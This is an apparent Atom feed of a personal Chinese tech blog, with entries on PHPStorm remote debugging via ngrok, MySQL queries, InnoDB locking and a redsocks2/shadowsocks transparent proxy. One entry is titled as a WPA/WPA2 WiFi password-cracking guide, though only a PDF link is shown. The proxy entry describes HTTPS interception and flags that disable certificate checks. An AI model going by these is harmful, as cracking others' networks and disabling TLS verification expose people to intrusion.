<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>jfo planet</title>
  <subtitle>Hope is the best gift that tomorrow gives.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.pickbox.me/"/>
  <updated>2017-01-07T09:52:51.000Z</updated>
  <id>http://blog.pickbox.me/</id>
  
  <author>
    <name>jfo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用macbook破解WPA_WPA2_WiFi密码</title>
    <link href="http://blog.pickbox.me/2017/01/07/%E4%BD%BF%E7%94%A8macbook%E7%A0%B4%E8%A7%A3WPA-WPA2-WiFi%E5%AF%86%E7%A0%81/"/>
    <id>http://blog.pickbox.me/2017/01/07/使用macbook破解WPA-WPA2-WiFi密码/</id>
    <published>2017-01-07T09:51:18.000Z</published>
    <updated>2017-01-07T09:52:51.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://img.pickbox.me/wp-content/uploads/使用macbook破解WPA_WPA2_WiFi密码.pdf" target="_blank" rel="external">pdf格式浏览</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://img.pickbox.me/wp-content/uploads/使用macbook破解WPA_WPA2_WiFi密码.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;pdf格式浏览&lt;/a&gt;&lt;/p&gt;

    
    </summary>
    
      <category term="Mac OS X" scheme="http://blog.pickbox.me/categories/Mac-OS-X/"/>
    
    
  </entry>
  
  <entry>
    <title>phpstorm远程调试odp</title>
    <link href="http://blog.pickbox.me/2017/01/07/phpstorm%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95odp/"/>
    <id>http://blog.pickbox.me/2017/01/07/phpstorm远程调试odp/</id>
    <published>2017-01-07T09:46:57.000Z</published>
    <updated>2017-01-07T10:09:10.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="phpstorm远程调试odp"><a href="#phpstorm远程调试odp" class="headerlink" title="phpstorm远程调试odp"></a>phpstorm远程调试odp</h2><p>参考配置：<a href="http://wiki.baidu.com/pages/viewpage.action?pageId=108780531" target="_blank" rel="external">http://wiki.baidu.com/pages/viewpage.action?pageId=108780531</a><br><a href="http://img.pickbox.me/wp-content/uploads/搭建基于ODP的PHP远程开发与单步调试环境.pdf" target="_blank" rel="external">pdf下载</a></p>
<h3 id="php-ini配置"><a href="#php-ini配置" class="headerlink" title="php.ini配置"></a>php.ini配置</h3><p>xdebug.remote_host指定为本机，后面会将本地9000端口映射给ide机器</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[xdebug]</div><div class="line">zend_extension="/home/users/jiangzhenyu/odp/php/ext/xdebug.so"</div><div class="line">xdebug.remote_host=127.0.0.1</div><div class="line">xdebug.remote_port=9000</div><div class="line">xdebug.remote_enable=true</div><div class="line">xdebug.idekey=111</div><div class="line">request_terminate_timeout=600s</div></pre></td></tr></table></figure>
<p>重启php-fpm</p>
<h3 id="端口映射（tunnel）"><a href="#端口映射（tunnel）" class="headerlink" title="端口映射（tunnel）"></a>端口映射（tunnel）</h3><p>注意ngrok自己编译，IDE本机和服务端要使用同一套ssl key文件</p>
<p>服务器端运行ngrokd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ~/downloads/ngrok/bin/ngrokd -tlsKey=/home/users/jiangzhenyu/downloads/ngrok/ssl/server.key -tlsCrt=/home/users/jiangzhenyu/downloads/ngrok/ssl/server.crt -domain=&quot;cp01-rdqa-dev601.cp01.baidu.com&quot; -httpAddr=&quot;:8711&quot; -httpsAddr=&quot;:8722&quot; -tunnelAddr=&quot;:8443&quot; -log=stdout</div></pre></td></tr></table></figure>
<p>IDE机器运行ngrok</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> ~/work/project/trying/ngrok</div><div class="line">$ cat ngrok.cfg</div><div class="line">server_addr: <span class="string">"cp01-rdqa-dev601.cp01.baidu.com:8443"</span></div><div class="line">trust_host_root_certs: <span class="literal">false</span></div><div class="line">tunnels:</div><div class="line">  php:</div><div class="line">    remote_port: 9000</div><div class="line">    proto:</div><div class="line">      tcp: 9000</div><div class="line"></div><div class="line">$ ./bin/ngrok -config ngrok.cfg start php</div></pre></td></tr></table></figure>
<p>这样服务器的9000端口就映射到IDE本机，phpstorm能从9000端口接受到远程调试指令</p>
<h3 id="配置phpstorm"><a href="#配置phpstorm" class="headerlink" title="配置phpstorm"></a>配置phpstorm</h3><p>按照教程配即可</p>
<ol>
<li>配置PHPStorm的远程Interpreter：Language &amp; Frameworks &gt; PHP</li>
<li>配置PHPStorm的xdebug port</li>
<li>配置PHPStorm的server path mapping</li>
<li>配置PHPStorm的debug config：添加一个web application调试项</li>
</ol>
<p><img src="http://img.pickbox.me/wp-content/uploads/phpstorm_interpreter_config.png"></p>
<p><img src="http://img.pickbox.me/wp-content/uploads/phpstorm_xdebug_port.png"></p>
<p><img src="http://img.pickbox.me/wp-content/uploads/phpstorm_server_path_mapping.png"></p>
<p><img src="http://img.pickbox.me/wp-content/uploads/phpstorm_debug_config_web_application.png"></p>
<p><img src="http://img.pickbox.me/wp-content/uploads/phpstorm_listening_for_debug.png"></p>
<h3 id="ODP代码"><a href="#ODP代码" class="headerlink" title="ODP代码"></a>ODP代码</h3><p>注意，actions下的odp代码才能调试，可以添加一个actions/test/Test.php，添加断点后开始调试</p>
<h3 id="启动调试"><a href="#启动调试" class="headerlink" title="启动调试"></a>启动调试</h3><p>点击phpstorm的debug按钮，即可启动一个web页面：<br><a href="http://cp01-rdqa-dev601.cp01.baidu.com:8421/cserver/test/test?XDEBUG_SESSION_START=16067" target="_blank" rel="external">http://cp01-rdqa-dev601.cp01.baidu.com:8421/cserver/test/test?XDEBUG_SESSION_START=16067</a></p>
<h3 id="超时配置"><a href="#超时配置" class="headerlink" title="超时配置"></a>超时配置</h3><p>修改以下3处配置，防止调试过程中过早断开与phpstorm的连接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># php*.ini （/usr/local/php/etc/php*.ini）:</div><div class="line">max_execution_time=7200</div><div class="line"> </div><div class="line"># php-fpm.conf （/usr/local/php/etc/php-fpm.conf）:</div><div class="line">request_terminate_timeout = 0  # fpm不加执行时间限制，少管闲事。</div><div class="line"> </div><div class="line"># nginx （/usr/local/nginx/conf/nginx.conf）在http端添加或修改这两个:</div><div class="line">fastcgi_connect_timeout 7200s;   # 因为php-fpm可能会被调试阻塞</div><div class="line">fastcgi_read_timeout 7200s;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;phpstorm远程调试odp&quot;&gt;&lt;a href=&quot;#phpstorm远程调试odp&quot; class=&quot;headerlink&quot; title=&quot;phpstorm远程调试odp&quot;&gt;&lt;/a&gt;phpstorm远程调试odp&lt;/h2&gt;&lt;p&gt;参考配置：&lt;a href=&quot;http
    
    </summary>
    
      <category term="python/js/php/html/mysql/http" scheme="http://blog.pickbox.me/categories/python-js-php-html-mysql-http/"/>
    
    
  </entry>
  
  <entry>
    <title>Mysql 常用 SQL 语句集锦</title>
    <link href="http://blog.pickbox.me/2016/12/17/Mysql-%E5%B8%B8%E7%94%A8-SQL-%E8%AF%AD%E5%8F%A5%E9%9B%86%E9%94%A6/"/>
    <id>http://blog.pickbox.me/2016/12/17/Mysql-常用-SQL-语句集锦/</id>
    <published>2016-12-17T09:21:32.000Z</published>
    <updated>2016-12-17T09:41:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//查询时间，友好提示</div><div class="line">$sql = "<span class="keyword">select</span> <span class="keyword">date_format</span>(create_time, <span class="string">'%Y-%m-%d'</span>) <span class="keyword">as</span> <span class="keyword">day</span> <span class="keyword">from</span> table_name<span class="string">";</span></div></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//int 时间戳类型</div><div class="line">$sql = "<span class="keyword">select</span> from_unixtime(create_time, <span class="string">'%Y-%m-%d'</span>) <span class="keyword">as</span> <span class="keyword">day</span> <span class="keyword">from</span> table_name<span class="string">";</span></div></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//一个sql返回多个总数</div><div class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) 全部,</div><div class="line"><span class="keyword">count</span>(<span class="keyword">case</span> <span class="keyword">when</span> ticketstatus = <span class="number">2</span> <span class="keyword">then</span> ticketstatus <span class="keyword">end</span>) 已出票,</div><div class="line"><span class="keyword">count</span>(<span class="keyword">case</span> <span class="keyword">when</span> ticketstatus = <span class="number">4</span> <span class="keyword">then</span> ticketstatus <span class="keyword">end</span>) 退款成功</div><div class="line"><span class="keyword">from</span> db_order.trainself_ticket</div></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">//替换某字段的内容的语句</div><div class="line">$sql = "<span class="keyword">update</span> table_name <span class="keyword">set</span> <span class="keyword">content</span> = <span class="keyword">REPLACE</span>(<span class="keyword">content</span>, <span class="string">'aaa'</span>, <span class="string">'bbb'</span>) <span class="string">";</span></div><div class="line">$sql .= " <span class="keyword">where</span> (<span class="keyword">content</span> <span class="keyword">like</span> <span class="string">'%aaa%'</span>)<span class="string">";</span></div></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//获取表中某字段包含某字符串的数据</div><div class="line">$sql = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> db_order.trainself_ticket <span class="keyword">WHERE</span> <span class="keyword">LOCATE</span>(<span class="string">'杭州'</span>, departurestationname) <span class="string">";</span></div></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//获取字段中的前4位</div><div class="line">$sql = "<span class="keyword">SELECT</span> <span class="keyword">SUBSTRING</span>(字段名,<span class="number">1</span>,<span class="number">4</span>) <span class="keyword">FROM</span> 表名 <span class="string">";</span></div></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">//查找表中多余的重复记录</div><div class="line">//单个字段</div><div class="line">$sql = "<span class="keyword">select</span> * <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段名 <span class="keyword">in</span> <span class="string">";</span></div><div class="line">$sql .= "(<span class="keyword">select</span> 字段名 <span class="keyword">from</span> 表名 <span class="keyword">group</span> <span class="keyword">by</span> 字段名 <span class="keyword">having</span> <span class="keyword">count</span>(字段名) &gt; <span class="number">1</span> )<span class="string">";</span></div><div class="line">//多个字段</div><div class="line">$sql = "<span class="keyword">select</span> * <span class="keyword">from</span> 表名 别名 <span class="keyword">where</span> (别名.字段<span class="number">1</span>,别名.字段<span class="number">2</span>) <span class="keyword">in</span> <span class="string">";</span></div><div class="line">$sql .= "(<span class="keyword">select</span> 字段<span class="number">1</span>,字段<span class="number">2</span> <span class="keyword">from</span> 表名 <span class="keyword">group</span> <span class="keyword">by</span> 字段<span class="number">1</span>,字段<span class="number">2</span> <span class="keyword">having</span> <span class="keyword">count</span>(*) &gt; <span class="number">1</span> )<span class="string">";</span></div></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">//删除表中多余的重复记录(留id最小)</div><div class="line">//单个字段</div><div class="line">$sql = "<span class="keyword">delete</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段名 <span class="keyword">in</span> <span class="string">";</span></div><div class="line">$sql .= "(<span class="keyword">select</span> 字段名 <span class="keyword">from</span> 表名 <span class="keyword">group</span> <span class="keyword">by</span> 字段名 <span class="keyword">having</span> <span class="keyword">count</span>(字段名) &gt; <span class="number">1</span>)  <span class="string">";</span></div><div class="line">$sql .= "<span class="keyword">and</span> 主键<span class="keyword">ID</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">";</span></div><div class="line">$sql .= "(<span class="keyword">select</span> <span class="keyword">min</span>(主键<span class="keyword">ID</span>) <span class="keyword">from</span> 表名 <span class="keyword">group</span> <span class="keyword">by</span> 字段名 <span class="keyword">having</span> <span class="keyword">count</span>(字段名 )&gt;<span class="number">1</span>) <span class="string">";</span></div><div class="line">//多个字段</div><div class="line">$sql = "<span class="keyword">delete</span> <span class="keyword">from</span> 表名 别名 <span class="keyword">where</span> (别名.字段<span class="number">1</span>,别名.字段<span class="number">2</span>) <span class="keyword">in</span> <span class="string">";</span></div><div class="line">$sql .= "(<span class="keyword">select</span> 字段<span class="number">1</span>,字段<span class="number">2</span> <span class="keyword">from</span> 表名 <span class="keyword">group</span> <span class="keyword">by</span> 字段<span class="number">1</span>,字段<span class="number">2</span> <span class="keyword">having</span> <span class="keyword">count</span>(*) &gt; <span class="number">1</span>) <span class="string">";</span></div><div class="line">$sql .= "<span class="keyword">and</span> 主键<span class="keyword">ID</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">";</span></div><div class="line">$sql .= "(<span class="keyword">select</span> <span class="keyword">min</span>(主键<span class="keyword">ID</span>) <span class="keyword">from</span> 表名 <span class="keyword">group</span> <span class="keyword">by</span> 字段<span class="number">1</span>,字段<span class="number">2</span> <span class="keyword">having</span> <span class="keyword">count</span>(*)&gt;<span class="number">1</span>) <span class="string">";</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;基础篇&quot;&gt;&lt;a href=&quot;#基础篇&quot; class=&quot;headerlink&quot; title=&quot;基础篇&quot;&gt;&lt;/a&gt;基础篇&lt;/h2&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div
    
    </summary>
    
      <category term="python/js/php/html/mysql/http" scheme="http://blog.pickbox.me/categories/python-js-php-html-mysql-http/"/>
    
    
  </entry>
  
  <entry>
    <title>数据库锁</title>
    <link href="http://blog.pickbox.me/2016/12/17/%E6%95%B0%E6%8D%AE%E5%BA%93%E9%94%81/"/>
    <id>http://blog.pickbox.me/2016/12/17/数据库锁/</id>
    <published>2016-12-17T08:44:31.000Z</published>
    <updated>2016-12-17T09:57:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="select-for-update"><a href="#select-for-update" class="headerlink" title="select for update"></a>select for update</h2><p>由于InnoDB 预设是Row-Level Lock，所以只有「明确」的指定主键，MySQL 才会执行Row lock (只锁住被选取的数据) ，否则MySQL 将会执行Table Lock (将整个数据表单给锁住)。</p>
<p>例1: (明确指定主键，并且有此数据，row lock)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'3'</span> <span class="keyword">FOR</span> <span class="keyword">UPDATE</span>;</div></pre></td></tr></table></figure>
<p>例2: (明确指定主键，若查无此数据，无lock)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'-1'</span> <span class="keyword">FOR</span> <span class="keyword">UPDATE</span>;</div></pre></td></tr></table></figure>
<p>例3: (无主键，table lock)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> <span class="keyword">name</span>=<span class="string">'Mouse'</span> <span class="keyword">FOR</span> <span class="keyword">UPDATE</span>;</div></pre></td></tr></table></figure>
<p>例4: (主键不明确，table lock)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> <span class="keyword">id</span>&lt;&gt;<span class="string">'3'</span> <span class="keyword">FOR</span> <span class="keyword">UPDATE</span>;</div></pre></td></tr></table></figure>
<p>例5: (主键不明确，table lock)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> <span class="keyword">id</span> <span class="keyword">LIKE</span> <span class="string">'3'</span> <span class="keyword">FOR</span> <span class="keyword">UPDATE</span>;</div></pre></td></tr></table></figure>
<p>注1: FOR UPDATE 仅适用于InnoDB，且必须在事务区块(BEGIN/COMMIT)中才能生效。</p>
<p><strong>【几个问题】</strong></p>
<ol>
<li>什么时候解锁？<ul>
<li>需要commit之后才会解锁</li>
</ul>
</li>
<li>如果在for update一个行后网络断掉，这个行会在什么时候解锁？<ul>
<li>服务器无法判断连接是否断开，一般需要手工解锁；如果主动关闭连接，服务器会解锁</li>
</ul>
</li>
<li>如何查询一个行是否被锁定？<ul>
<li>select …. from update nowait，不需要等待，如果已被锁，立即失败，如果未被锁，立即成功锁定</li>
</ul>
</li>
</ol>
<h2 id="READ-COMMITTED-与-REPEATABLE-READ"><a href="#READ-COMMITTED-与-REPEATABLE-READ" class="headerlink" title="READ COMMITTED 与 REPEATABLE READ"></a>READ COMMITTED 与 REPEATABLE READ</h2><p>先看一个例子</p>
<table>
<thead>
<tr>
<th>t1</th>
<th>t2</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>begin;</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>begin;</td>
<td></td>
</tr>
<tr>
<td>update mytest set t3=’cc’ where t2=’bb’;</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>select * from mytest where t2=’bb’;</td>
<td>Mark A</td>
</tr>
<tr>
<td>commit;</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>select * from mytest where t2=’bb’;</td>
<td>Mark B</td>
</tr>
<tr>
<td></td>
<td>commit;</td>
</tr>
</tbody>
</table>
<ol>
<li>上面Mark A处显然t1已经给记录加了X锁，并且在事务内修改了数据，此时t2看到的数据是什么？</li>
<li>上面Mark B处事务t1已经提交此时t2看到的数据是什么？</li>
</ol>
<p>每个行记录有多个版本。行多版本通过undo日志实现，undo日志包括了所有用来恢复历史版本数据的信息，那么我们只要将“不同版本”指针指向不同时间节点的undo日志，这样读取的时候通过对不同时间节点的undo日志进行恢复，得到不同的版本数据。同时对于undo日志的读取是不需要加锁的，因此这极大地提高了数据库的并发性。</p>
<p><strong>t2此时看到的应该是历史版本的数据，也就是t1修改之前的数据</strong></p>
<p>READ COMMITTED值的是一个事务可以读取其他事务已经提交的数据，而REPEATABLE READ要求一个事务在事务内可以重复读取一条记录。</p>
<p><strong>innodb默认的隔离级别为REPEATABLE READ，t2在Mark B的地方看到的应该是老数据</strong></p>
<p><strong>如果此时的事务隔离级别为READ COMMITTED，t2在Mark B处看到的应该是新数据</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;select-for-update&quot;&gt;&lt;a href=&quot;#select-for-update&quot; class=&quot;headerlink&quot; title=&quot;select for update&quot;&gt;&lt;/a&gt;select for update&lt;/h2&gt;&lt;p&gt;由于InnoDB 预
    
    </summary>
    
      <category term="python/js/php/html/mysql/http" scheme="http://blog.pickbox.me/categories/python-js-php-html-mysql-http/"/>
    
    
  </entry>
  
  <entry>
    <title>透明代理：redsocks2_shadowsocks</title>
    <link href="http://blog.pickbox.me/2016/12/04/%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86%EF%BC%9Aredsocks2-shadowsocks/"/>
    <id>http://blog.pickbox.me/2016/12/04/透明代理：redsocks2-shadowsocks/</id>
    <published>2016-12-04T07:11:37.000Z</published>
    <updated>2016-12-18T06:29:23.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="redsocks2-shadowsocks"><a href="#redsocks2-shadowsocks" class="headerlink" title="redsocks2 + shadowsocks"></a>redsocks2 + shadowsocks</h2><h3 id="几点说明"><a href="#几点说明" class="headerlink" title="几点说明"></a>几点说明</h3><ul>
<li><p>socket四要素：srcIP + srcPort + destIP + destPort唯一确定一个socket连接。server端<code>accept</code>监听到连接请求后，通常会另起一个子进程处理，但accept返回的新socket，与accept监听的端口还是一样的，都是server_port，而不是新开一个port(no new port is opened)，参考<a href="http://stackoverflow.com/questions/489036/how-does-the-socket-api-accept-function-work" target="_blank" rel="external">How does the socket API accept() function work?</a></p>
</li>
<li><p>iptables SNAT/DNAT：<code>--to</code>更改TCP/IP包中的IP和Port，通过第三层TCP/IP协议将数据包送达目标机器</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -t nat -A POSTROUTING -s 172.16.36.0/24 -j SNAT --to $PROXY_IP:$PROXY_PORT</div></pre></td></tr></table></figure>
</li>
<li><p>默认网关：通过链路层MAC地址将数据包送达目标机器。TCP/IP协议中没有关于默认网关IP的字段，通过ARP协议获取到默认网关IP对应的MAC地址，数据包发送出去时，在第二层链路层添加MAC地址，这样数据包就会被默认网关接收到</p>
</li>
<li><p>iptables redirect：会把原来的目标地址和端口改掉。REDIRECT使用了ip_conntrack模块，可以通过函数接口获取原来目的地址<br><br>if you redirect TCP traffic, the ip_conntrack provides a getsockopt() to get the original destination address.<br><br>REDIRECT实际上也是一种特殊的NAT</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">This target is only valid in the nat table, in the PREROUTING and OUTPUT </div><div class="line">       chains, and user-defined chains which are only  called  from  those</div><div class="line">       chains.   It redirects the packet to the machine itself by changing the</div><div class="line">       destination IP  to  the  primary  address  of  the  incoming  interface</div><div class="line">       (locally-generated  packets  are  mapped to the 127.0.0.1 address).  It</div><div class="line">       takes one option</div><div class="line"></div><div class="line">       --to-ports port[-port]</div><div class="line">              This specifies a destination port or  range  of  ports  to  use:</div><div class="line">              without  this,  the  destination port is never altered.  This is</div><div class="line">              only valid if the rule also specifies -p tcp or -p udp.</div></pre></td></tr></table></figure>
<h3 id="redsocks2"><a href="#redsocks2" class="headerlink" title="redsocks2"></a>redsocks2</h3><p>TCP/IP中的目标地址一旦修改，就无法将数据包发送给真正的目标对象，而所有的socket监听，只有目标地址是自己才能接收，上层应用想代理流量，必须处理这一对矛盾，而iptables的redirect刚好派上用场</p>
<p>redsocks通过修改iptables，将流量redirect到自己监听的端口号，并且通过getdestaddr获取原目标ip和port，然后遵循代理协议格式将流量转发给代理</p>
<p>redsocks2在redsocks基础上进行增强，支持智能代理：只有直接连接失败的才通过代理访问</p>
<p>目前来看，只有使用redsocks真正实现透明代理</p>
<p>项目下载：</p>
<ul>
<li><a href="https://github.com/darkk/redsocks" target="_blank" rel="external">redsocks</a></li>
<li><a href="https://github.com/semigodking/redsocks" target="_blank" rel="external">redsocks2</a></li>
</ul>
<h3 id="方案细节"><a href="#方案细节" class="headerlink" title="方案细节"></a>方案细节</h3><p>能刷openwrt固件的路由都容易集成redsocks和shadowsocks，不过路由一般容量受限，例如4M内存+16M Flash，影响发挥</p>
<p>刚好有一块cubieboard2板，装Ubuntu12.04，可以用来布置整套透明代理：redsocks2 + shadowsocks</p>
<p>再从路由器的DHCP配置中将gateway地址修改为cubieboard的IP地址即可，这样局域网所有机器都通过cubieboard代理上网</p>
<h2 id="其他方案"><a href="#其他方案" class="headerlink" title="其他方案"></a>其他方案</h2><p>下面列出几种尝试过的方案</p>
<h3 id="pcap-dnsproxy-nginx"><a href="#pcap-dnsproxy-nginx" class="headerlink" title="pcap_dnsproxy + nginx"></a>pcap_dnsproxy + nginx</h3><ul>
<li><p>基本思路：通过pcap_dnsproxy将需要代理的url IP地址解析为自己的代理服务器地址，流量通过代理服务器nginx反向代理进行访问</p>
</li>
<li><p>问题：浏览器https访问时，会提示网站证书问题，因为我们的nginx透明代理扮演中间人的角色，不被客户端信任。<br>wget 可以用–no-check-certificate忽略证书，casperjs用–ignore-ssl-errors=yes忽略</p>
</li>
<li><p>dnsproxy Host.ini配置：</p>
</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[Hosts]</div><div class="line">52.197.180.130 .*\.google.com.*</div><div class="line">52.197.180.130 .*\.gstatic.com</div><div class="line">52.197.180.130 .*\.googleusercontent.com</div><div class="line">52.197.180.130 .*\.googleadservices.com</div><div class="line">52.197.180.130 .*\.doubleclick.com</div></pre></td></tr></table></figure>
<p>语法类似/etc/hosts文件，但可以使用正则匹配，方便很多</p>
<ul>
<li>nginx 443端口配置：</li>
</ul>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="section">server</span> &#123;</div><div class="line">    <span class="attribute">resolver</span> <span class="number">8.8.8.8</span>;</div><div class="line">    <span class="attribute">listen</span>       <span class="number">443</span> ssl;</div><div class="line">    <span class="comment">#server_name  ssl.pickbox.me;</span></div><div class="line"></div><div class="line">    <span class="attribute">ssl_certificate</span>      /opt/nginx/ssl/example_com.crt;</div><div class="line">    <span class="attribute">ssl_certificate_key</span>  /opt/nginx/ssl/example_com.key;</div><div class="line">    <span class="attribute">ssl_verify_client</span>    <span class="literal">off</span>;</div><div class="line"></div><div class="line">    <span class="attribute">ssl_session_timeout</span>  <span class="number">5m</span>;</div><div class="line"></div><div class="line">    <span class="attribute">location</span> / &#123;</div><div class="line">        <span class="attribute">proxy_pass</span> <span class="variable">$scheme</span>://<span class="variable">$host</span><span class="variable">$request_uri</span>;</div><div class="line">        <span class="attribute">proxy_redirect</span>     <span class="literal">off</span>;</div><div class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</div><div class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</div><div class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="attribute">access_log</span>  logs/access.p.log;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>需要生成cert文件，用gencert.sh脚本生成</p>
<p>80端口配置类似</p>
<h3 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h3><p><a href="http://www.cnblogs.com/lexus/archive/2012/02/14/2351939.html" target="_blank" rel="external">http://www.cnblogs.com/lexus/archive/2012/02/14/2351939.html</a></p>
<p><a href="http://img.pickbox.me/wp-content/uploads/iptables-Transparent_web_proxy.pdf" target="_blank" rel="external">下载</a></p>
<p>该方法同样有https证书问题，看看加深对socket四要素理解吧</p>
